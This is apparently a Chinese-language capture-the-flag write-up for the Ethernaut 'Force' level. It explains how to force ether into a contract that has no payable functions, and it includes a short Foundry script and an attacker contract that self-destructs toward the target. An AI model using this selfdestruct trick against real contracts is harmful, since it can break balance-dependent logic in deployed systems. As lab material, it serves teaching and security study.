# Level 7 - Force
## 題目
[Force](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)

### 通關條件
這一關的目標是使合約的餘額大於 0
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
## 解題
這題目標是讓合約地址有錢，向合約轉帳可以透過：
1. 帶有 `payable` 屬性的 function
2. `receive()`
3. 呼叫不存在的 function 觸發有帶 `payable` 屬性的 `fallback()`

但是當合約中沒有 `receice()` 和 `fallback() payable` 時，直接向地址轉帳會出錯並回滾。所以這題不能使用上述方法，這邊要考的是 **selfdestruct**

**selfdestruct** 是合約的自毀功能，可以使合約把自己消除。當合約消除自己時，會把合約中剩餘的資產都打到指定的地址中。所以我們要建立一個合約並向裡面存一些錢，再讓它自毀並指定把錢轉進關卡的地址中，攻擊如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        new ForceAttacker{value: 1 wei}(payable(your_challenge_address));
        
        vm.stopBroadcast();
    }
}

contract ForceAttacker {

    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
} 
```
關於自毀合約，可以參考以下文章：
- [WTF Solidity极简入门: 26. 删除合约](https://github.com/AmazingAng/WTF-Solidity/tree/main/26_DeleteContract)
- [Solidity by Example - Self Destruct
](https://solidity-by-example.org/hacks/self-destruct/)
